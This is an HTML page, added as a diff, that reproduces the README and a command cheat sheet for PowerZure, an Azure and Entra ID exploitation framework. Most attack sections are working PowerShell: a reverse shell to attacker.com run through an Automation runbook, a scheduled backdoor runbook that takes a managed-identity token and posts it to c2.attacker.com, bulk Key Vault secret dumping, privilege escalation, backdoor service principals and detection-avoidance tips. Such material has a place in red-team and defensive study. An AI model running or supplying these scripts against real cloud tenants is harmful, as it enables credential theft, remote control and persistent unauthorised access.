@@ -1,0 +1,469 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>powerzure - Breachcraft Dev</title>
+<meta name="description" content="For a list of functions, their usage, and more, check out https://powerzure.readthedocs.io">
+<link rel="canonical" href="https://breachcraft.dev/tools/powerzure/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">powerzure</p>
+  <h1>powerzure</h1>
+  <p class="lede">For a list of functions, their usage, and more, check out https://powerzure.readthedocs.io</p>
+  <h2>What it is</h2>
+<h4>For a list of functions, their usage, and more, check out <a href="https://powerzure.readthedocs.io">https://powerzure.readthedocs.io</a></h4>
+<h3>What is PowerZure?</h3>
+<p>PowerZure is a PowerShell project created to assess and exploit resources within Microsoft’s cloud platform, Azure. PowerZure was created out of the need for a framework that can both perform reconnaissance <strong>and</strong> exploitation of Azure, EntraID, and the associated resources.</p>
+<h3>Requirements</h3>
+<p>The "Az" <a href="https://docs.microsoft.com/en-us/powershell/azure/?view=azps-4.2.0">Azure PowerShell</a> module is the primary module used in PowerZure, as it handles most requests interacting with Azure resources. The Az module interacts using the Azure REST API. It can be installed via PowerShell command <code>Install-Module -Name Az</code></p>
+<h3>Usage</h3>
+<p>RTFM: <a href="https://powerzure.readthedocs.io">https://powerzure.readthedocs.io</a></p>
+<p><code>ipmo C:\path\to\PowerZure.psd1</code></p>
+<p>If you have multiple subscriptions, you must set the main subscription with <code>Set-AzureSubscription</code>. If you do not do this, things will fail.</p>
+<h3>Additional Resources</h3>
+<p>You can type <code>Get-AzureCurrentUser</code> to view the current signed-in user's roles in Azure and EntraID.</p>
+<p>You can also type <code>Get-AzureTarget</code> to compare your current signed-in user's roles and their scope to resources within Azure.</p>
+<p>For target finding, I recommend using <a href="https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350">AzureHound</a>, the Azure component to <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>.</p>
+<h3>Author &amp; License</h3>
+<p>Author: Ryan Hausknecht (@haus3c)</p>
+<p>License: BSD-3</p>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> PowerShell Module</li><li><strong>Purpose</strong> Azure and Entra ID reconnaissance and exploitation framework</li><li><strong>Platform</strong> Windows, PowerShell Core (Linux/macOS)</li><li><strong>Tags</strong> #azure #azuread #powershell #enumeration #privesc #persistence #lateral-movement #post-exploitation</li></ul>
+<h3>Installation &amp; Setup</h3>
+<pre><code># Install Az module prerequisite
+Install-Module -Name Az
+
+# Import PowerZure
+Import-Module C:\path\to\PowerZure.psd1
+
+# Or use alias
+ipmo C:\path\to\PowerZure.psd1
+
+# Authenticate to Azure
+Connect-AzAccount
+
+# Set subscription (IMPORTANT!)
+Set-AzureSubscription -Id &lt;subscription-id&gt;
+# If you have multiple subscriptions and don't set this, commands will fail</code></pre>
+<h3>Quick Reference (Most Common Commands)</h3>
+<pre><code># Check current user context
+Get-AzureCurrentUser
+
+# Compare permissions to available resources
+Get-AzureTarget
+
+# List all subscriptions
+Get-AzureSubscription
+
+# Find runbooks
+Get-Runbook
+
+# Execute code via runbook
+Execute-Runbook -Script "whoami" -RunbookName "TestRunbook"
+
+# Get deployment templates (may contain secrets)
+Get-AzureDeploymentTemplate</code></pre>
+<h3>RECON: Information Gathering</h3>
+<h4>RECON: Current User Context</h4>
+<p><strong>Use Case:</strong> Understand your current permissions and scope</p>
+<pre><code># View current user and roles
+Get-AzureCurrentUser
+
+# Show Azure RBAC roles
+# Show EntraID directory roles
+# Display assigned scopes
+
+# Compare permissions to resources
+Get-AzureTarget
+
+# Shows what you can access based on your roles</code></pre>
+<h4>RECON: Subscription Enumeration</h4>
+<p><strong>Use Case:</strong> List accessible subscriptions</p>
+<pre><code># List all subscriptions
+Get-AzureSubscription
+
+# Set active subscription
+Set-AzureSubscription -Id "sub-id"
+
+# Get subscription details
+Get-AzSubscription</code></pre>
+<h4>RECON: Tenant Information</h4>
+<p><strong>Use Case:</strong> Gather tenant details</p>
+<pre><code># Get tenant information
+Get-AzTenant
+
+# List all Azure AD users
+Get-AzADUser
+
+# List all groups
+Get-AzADGroup
+
+# List service principals
+Get-AzADServicePrincipal</code></pre>
+<h3>ENUM: Resource Enumeration</h3>
+<h4>ENUM: Virtual Machines</h4>
+<p><strong>Use Case:</strong> Discover VMs in subscription</p>
+<pre><code># List all VMs
+Get-AzVM
+
+# Get VM details
+Get-AzVM -Name "vmname" -ResourceGroupName "rg-name"
+
+# List VM extensions
+Get-AzVMExtension -ResourceGroupName "rg-name" -VMName "vmname"
+
+# Check for managed identity
+Get-AzVM -Name "vmname" -ResourceGroupName "rg-name" | Select-Object -ExpandProperty Identity</code></pre>
+<h4>ENUM: Storage Accounts</h4>
+<p><strong>Use Case:</strong> Find storage accounts and check for open access</p>
+<pre><code># List all storage accounts
+Get-AzStorageAccount
+
+# Get storage account keys
+Get-AzStorageAccountKey -ResourceGroupName "rg-name" -Name "storageaccount"
+
+# List containers in storage account
+Get-AzStorageContainer -Context $ctx
+
+# Check for public blob access
+# Use MicroBurst Get-AzurePasswords for automated checks</code></pre>
+<h4>ENUM: Key Vaults</h4>
+<p><strong>Use Case:</strong> Discover key vaults and secrets</p>
+<pre><code># List all key vaults
+Get-AzKeyVault
+
+# List secrets in key vault
+Get-AzKeyVaultSecret -VaultName "vaultname"
+
+# Get secret value (if you have permissions)
+Get-AzKeyVaultSecret -VaultName "vaultname" -Name "secretname" -AsPlainText
+
+# List keys
+Get-AzKeyVaultKey -VaultName "vaultname"
+
+# List certificates
+Get-AzKeyVaultCertificate -VaultName "vaultname"</code></pre>
+<h4>ENUM: Automation Accounts</h4>
+<p><strong>Use Case:</strong> Find automation accounts and runbooks</p>
+<pre><code># List automation accounts
+Get-AzAutomationAccount
+
+# List runbooks
+Get-Runbook
+
+# Get runbook content
+Get-AzAutomationRunbook -Name "runbookname" -ResourceGroupName "rg-name" -AutomationAccountName "aa-name"
+
+# Export runbook
+Export-AzAutomationRunbook -Name "runbookname" -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -OutputFolder ./</code></pre>
+<h4>ENUM: App Services / Functions</h4>
+<p><strong>Use Case:</strong> Enumerate web apps and function apps</p>
+<pre><code># List web apps
+Get-AzWebApp
+
+# Get app service configuration
+Get-AzWebApp -Name "appname" -ResourceGroupName "rg-name"
+
+# List function apps
+Get-AzFunctionApp
+
+# Get app settings (may contain secrets)
+(Get-AzWebApp -Name "appname" -ResourceGroupName "rg-name").SiteConfig.AppSettings</code></pre>
+<h3>CRED: Credential &amp; Secret Extraction</h3>
+<h4>CRED: Deployment Templates</h4>
+<p><strong>Use Case:</strong> Extract credentials from ARM templates</p>
+<pre><code># Get deployment templates
+Get-AzureDeploymentTemplate
+
+# Templates often contain:
+# - Passwords
+# - Connection strings
+# - API keys
+# - Service principal secrets
+
+# Parse for sensitive data
+Get-AzureDeploymentTemplate | Select-String -Pattern "password|secret|key|connectionstring"</code></pre>
+<h4>CRED: Azure Automation Credentials</h4>
+<p><strong>Use Case:</strong> Extract stored credentials from automation accounts</p>
+<pre><code># List automation credentials
+Get-AzAutomationCredential -ResourceGroupName "rg-name" -AutomationAccountName "aa-name"
+
+# Note: Azure encrypts credential values, but you can use them in runbooks</code></pre>
+<h4>CRED: Key Vault Secrets</h4>
+<p><strong>Use Case:</strong> Extract secrets if you have access</p>
+<pre><code># Get all secrets from key vault
+Get-AzKeyVaultSecret -VaultName "vaultname" | ForEach-Object {
+    Get-AzKeyVaultSecret -VaultName "vaultname" -Name $_.Name -AsPlainText
+}
+
+# Export to file
+Get-AzKeyVaultSecret -VaultName "vaultname" | ForEach-Object {
+    "$($_.Name): $(Get-AzKeyVaultSecret -VaultName "vaultname" -Name $_.Name -AsPlainText)"
+} | Out-File secrets.txt</code></pre>
+<h4>CRED: Managed Identity Tokens</h4>
+<p><strong>Use Case:</strong> Steal tokens from VM with managed identity</p>
+<pre><code># From inside Azure VM with managed identity
+$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json
+
+# Use token for authentication
+Connect-AzAccount -AccessToken $token.access_token -AccountId "MSI@&lt;resource-id&gt;"</code></pre>
+<h3>EXEC: Code Execution</h3>
+<h4>EXEC: Runbook Execution</h4>
+<p><strong>Use Case:</strong> Execute PowerShell code via Azure Automation runbook</p>
+<pre><code># Execute command via runbook
+Execute-Runbook -Script "whoami" -RunbookName "TestRunbook"
+
+# Execute script file
+Execute-Runbook -Script (Get-Content script.ps1 -Raw) -RunbookName "TestRunbook"
+
+# Reverse shell via runbook
+$payload = @'
+$client = New-Object System.Net.Sockets.TCPClient("attacker.com",443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+}
+'@
+
+Execute-Runbook -Script $payload -RunbookName "ReverseShell"</code></pre>
+<h4>EXEC: VM Command Execution</h4>
+<p><strong>Use Case:</strong> Run commands on Azure VMs</p>
+<pre><code># Using Run Command feature
+Invoke-AzVMRunCommand -ResourceGroupName "rg-name" -VMName "vmname" -CommandId "RunPowerShellScript" -ScriptPath ./payload.ps1
+
+# Run inline command
+Invoke-AzVMRunCommand -ResourceGroupName "rg-name" -VMName "vmname" -CommandId "RunPowerShellScript" -ScriptString "whoami; hostname; ipconfig"</code></pre>
+<h4>EXEC: Function App Code Execution</h4>
+<p><strong>Use Case:</strong> Execute code via Azure Functions</p>
+<pre><code># Get function app publish profile
+Get-AzWebAppPublishingProfile -ResourceGroupName "rg-name" -Name "functionapp"
+
+# Deploy malicious function
+# Requires publishing credentials from profile</code></pre>
+<h3>PRIVESC: Privilege Escalation</h3>
+<h4>PRIVESC: Abuse Contributor Role</h4>
+<p><strong>Use Case:</strong> Escalate from Contributor to higher privileges</p>
+<pre><code># If you have Contributor on subscription or resource group:
+
+# Create new automation account
+New-AzAutomationAccount -ResourceGroupName "rg-name" -Name "malicious-aa" -Location "eastus"
+
+# Automation account runs with RunAs account (service principal)
+# RunAs account has Contributor on subscription by default
+
+# Execute code as RunAs account
+Execute-Runbook -Script "whoami" -RunbookName "escalate"</code></pre>
+<h4>PRIVESC: Azure AD Application Permissions</h4>
+<p><strong>Use Case:</strong> Escalate via application with high permissions</p>
+<pre><code># If you can modify an application with high permissions:
+
+# Add owner to application
+New-AzADAppCredential -ObjectId &lt;app-object-id&gt;
+
+# Use new credentials to authenticate as application
+# Application may have higher Graph permissions than user
+
+# If app has RoleManagement.ReadWrite.Directory:
+# Can grant yourself Global Admin via Graph API</code></pre>
+<h4>PRIVESC: VM Managed Identity Abuse</h4>
+<p><strong>Use Case:</strong> Escalate using VM's managed identity permissions</p>
+<pre><code># From compromised VM with managed identity:
+
+# Get token for Azure RM
+$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json
+
+# Check identity's permissions
+# May have Contributor or Owner on resources
+# Use those permissions to escalate
+
+# Example: Add yourself to privileged group
+Add-AzADGroupMember -TargetGroupObjectId &lt;group-id&gt; -MemberObjectId &lt;your-object-id&gt;</code></pre>
+<h3>PERSIST: Persistence Mechanisms</h3>
+<h4>PERSIST: Create Service Principal</h4>
+<p><strong>Use Case:</strong> Create persistent access via service principal</p>
+<pre><code># Create application
+$app = New-AzADApplication -DisplayName "LegitApp"
+
+# Create service principal
+$sp = New-AzADServicePrincipal -ApplicationId $app.ApplicationId
+
+# Create secret
+$secret = New-AzADAppCredential -ObjectId $app.ObjectId
+
+# Grant permissions
+New-AzRoleAssignment -ObjectId $sp.Id -RoleDefinitionName "Contributor" -Scope "/subscriptions/&lt;sub-id&gt;"
+
+# Save credentials
+@{
+    TenantId = (Get-AzContext).Tenant.Id
+    ApplicationId = $app.ApplicationId
+    Secret = $secret.SecretText
+} | ConvertTo-Json | Out-File backdoor-sp.json
+
+# Later, authenticate with service principal
+$cred = Get-Credential  # Username: AppId, Password: Secret
+Connect-AzAccount -ServicePrincipal -Credential $cred -Tenant &lt;tenant-id&gt;</code></pre>
+<h4>PERSIST: Backdoor Runbook</h4>
+<p><strong>Use Case:</strong> Create persistence via scheduled runbook</p>
+<pre><code># Create runbook that calls back to C2
+$backdoorScript = @'
+$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json
+Invoke-WebRequest -Uri "https://c2.attacker.com/beacon" -Method POST -Body $token.access_token
+'@
+
+# Import runbook
+Import-AzAutomationRunbook -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -Name "SystemCheck" -Type PowerShell -Path ./backdoor.ps1
+
+# Publish runbook
+Publish-AzAutomationRunbook -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -Name "SystemCheck"
+
+# Create schedule (daily execution)
+New-AzAutomationSchedule -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -Name "DailyCheck" -StartTime (Get-Date).AddDays(1) -DayInterval 1
+
+# Link runbook to schedule
+Register-AzAutomationScheduledRunbook -ResourceGroupName "rg-name" -AutomationAccountName "aa-name" -RunbookName "SystemCheck" -ScheduleName "DailyCheck"</code></pre>
+<h4>PERSIST: Azure AD Application Backdoor</h4>
+<p><strong>Use Case:</strong> Maintain access via application credentials</p>
+<pre><code># Add secret to existing high-privilege application
+New-AzADAppCredential -ObjectId &lt;target-app-object-id&gt; -EndDate (Get-Date).AddYears(10)
+
+# The credential is added, but app owners may not notice
+# Use the secret to maintain access</code></pre>
+<h3>LATERAL: Lateral Movement</h3>
+<h4>LATERAL: Subscription Hopping</h4>
+<p><strong>Use Case:</strong> Move between subscriptions with same identity</p>
+<pre><code># List all accessible subscriptions
+Get-AzSubscription
+
+# Switch to different subscription
+Set-AzContext -Subscription &lt;subscription-id&gt;
+
+# Enumerate new subscription
+Get-AzResource</code></pre>
+<h4>LATERAL: VM to VM via Network</h4>
+<p><strong>Use Case:</strong> Lateral movement between VMs in same VNet</p>
+<pre><code># From compromised VM:
+
+# Enumerate VMs in same resource group/VNet
+Get-AzVM
+
+# Check network security group rules
+Get-AzNetworkSecurityGroup
+
+# Use standard lateral movement techniques (RDP, SSH, WinRM)
+# Often VMs trust each other within VNet</code></pre>
+<h4>LATERAL: Managed Identity Chaining</h4>
+<p><strong>Use Case:</strong> Chain managed identity permissions</p>
+<pre><code># VM1 has managed identity with permissions on VM2
+
+# From VM1:
+$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json
+
+# Use token to execute command on VM2
+Invoke-AzVMRunCommand -ResourceGroupName "rg-name" -VMName "vm2" -CommandId "RunPowerShellScript" -ScriptString "whoami"</code></pre>
+<h3>Attack Patterns</h3>
+<h4>Pattern: Contributor → Automation Account → Privilege Escalation</h4>
+<pre><code># 1. Verify you have Contributor role
+Get-AzureCurrentUser
+Get-AzureTarget
+
+# 2. Create automation account
+New-AzAutomationAccount -ResourceGroupName "CompanyRG" -Name "backdoor-aa" -Location "eastus" -Plan Free
+
+# 3. Create and execute runbook
+$escalateScript = "Add-AzADGroupMember -TargetGroupObjectId &lt;admin-group-id&gt; -MemberObjectId &lt;your-id&gt;"
+Execute-Runbook -Script $escalateScript -RunbookName "Escalate"
+
+# 4. Now you have admin privileges</code></pre>
+<h4>Pattern: VM Access → Managed Identity → Azure Control</h4>
+<pre><code># 1. Compromise Azure VM (via vuln, cred stuffing, etc.)
+
+# 2. Check for managed identity
+(Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' -Headers @{Metadata="true"}).Content
+
+# 3. Get token
+$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' -Headers @{Metadata="true"}).Content | ConvertFrom-Json
+
+# 4. Use token to control Azure resources
+Connect-AzAccount -AccessToken $token.access_token -AccountId "MSI@50342380-0000-0000-ba00-000000000000"
+
+# 5. Enumerate and exploit based on identity's permissions
+Get-AzRoleAssignment</code></pre>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Set Subscription</strong>: Always run <code>Set-AzureSubscription</code> if multiple subs exist 💡 <strong>Deployment Templates</strong>: Often goldmine of credentials and secrets 💡 <strong>Runbook Execution</strong>: Runs with high-privilege RunAs account 💡 <strong>Managed Identities</strong>: Check every VM - often overlooked persistence vector 💡 <strong>Automation Accounts</strong>: Free tier available, easy to create for persistence 💡 <strong>Key Vault Access</strong>: Even read-only on Key Vault can expose secrets 💡 <strong>Resource Tagging</strong>: Check tags for sensitive info (passwords, owners, etc.) 💡 <strong>Combine with AADInternals</strong>: Use both for full Azure + EntraID coverage 💡 <strong>VM Extensions</strong>: Can execute code, check for installed extensions 💡 <strong>Application Permissions</strong>: Apps can have higher permissions than users</p>
+<h3>OPSEC Considerations</h3>
+<p>⚠️ <strong>High Risk:</strong></p>
+<ul>
+<li>Creating new automation accounts (logged and may alert)</li>
+<li>Executing runbooks frequently</li>
+<li>Adding service principals to privileged roles</li>
+<li>Accessing many Key Vaults rapidly</li>
+</ul>
+<p>⚠️ <strong>Medium Risk:</strong></p>
+<ul>
+<li>Enumerating all resources in subscription</li>
+<li>Reading Key Vault secrets</li>
+<li>Executing VM run commands</li>
+<li>Exporting runbooks</li>
+</ul>
+<p>✅ <strong>Lower Risk:</strong></p>
+<ul>
+<li>Basic enumeration (Get-AzVM, Get-AzStorageAccount)</li>
+<li>Using existing automation accounts</li>
+<li>Reading deployment templates</li>
+<li>Viewing resource configurations</li>
+</ul>
+<h3>Key Functions Reference</h3>
+<p><strong>Reconnaissance:</strong></p>
+<ul>
+<li><code>Get-AzureCurrentUser</code>, <code>Get-AzureTarget</code>, <code>Get-AzureSubscription</code></li>
+</ul>
+<p><strong>Enumeration:</strong></p>
+<ul>
+<li><code>Get-AzVM</code>, <code>Get-AzStorageAccount</code>, <code>Get-AzKeyVault</code>, <code>Get-Runbook</code></li>
+</ul>
+<p><strong>Credential Access:</strong></p>
+<ul>
+<li><code>Get-AzureDeploymentTemplate</code>, <code>Get-AzKeyVaultSecret</code>, <code>Get-AzStorageAccountKey</code></li>
+</ul>
+<p><strong>Execution:</strong></p>
+<ul>
+<li><code>Execute-Runbook</code>, <code>Invoke-AzVMRunCommand</code></li>
+</ul>
+<p><strong>Persistence:</strong></p>
+<ul>
+<li><code>New-AzADApplication</code>, <code>New-AzADServicePrincipal</code>, <code>New-AzAutomationRunbook</code></li>
+</ul>
+<p><strong>Privilege Escalation:</strong></p>
+<ul>
+<li><code>New-AzRoleAssignment</code>, <code>New-AzADAppCredential</code></li>
+</ul>
+<h3>Resources</h3>
+<ul>
+<li>Documentation: <a href="https://powerzure.readthedocs.io">https://powerzure.readthedocs.io</a></li>
+<li>GitHub: <a href="https://github.com/hausec/PowerZure">https://github.com/hausec/PowerZure</a></li>
+<li>Author: @haus3c (Ryan Hausknecht)</li>
+<li>Recommended companion tools: AzureHound, AADInternals, MicroBurst</li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
